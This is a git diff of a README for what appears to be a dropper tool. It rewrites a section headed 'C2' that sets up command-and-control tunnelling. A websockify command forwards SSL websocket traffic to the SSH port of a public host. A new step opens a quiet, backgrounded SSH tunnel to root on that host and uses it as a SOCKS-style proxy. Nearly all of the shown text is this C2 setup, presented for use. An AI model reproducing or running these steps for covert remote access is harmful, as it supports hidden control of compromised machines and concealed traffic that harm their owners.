@@ -66,11 +66,17 @@ Build Dropper
        point your browser to it and/or proxifier. Note: no DNS masking yet.
 ```
 
-## V2:
+## C2:
+
+Unwrap websocket and forward to SSH port
 ```bash
-./websockify.py --ssl-only  --cert=/Users/dimas/Code/go/src/sshpipe/websocketd/sslcert.pem --key=/Users/dimas/Code/go/src/sshpipe/websocketd/sslkey.pem 8080 172.16.56.230:22
+./websockify.py --ssl-only  --cert=/Users/dimas/Code/go/src/sshpipe/websocketd/sslcert.pem --key=/Users/dimas/Code/go/src/sshpipe/websocketd/sslkey.pem 8080 167.99.88.24:22
 ``` 
- 
+
+Local SSH tunnel to proxy host in the background 
+``` 
+ssh  -N -f -q  -L 127.0.0.1:1080:127.0.0.1:1080 root@167.99.88.24
+``` 
 ## Code used
 Thanks to ref: 
 - https://gist.github.com/codref/473351a24a3ef90162cf10857fac0ff3
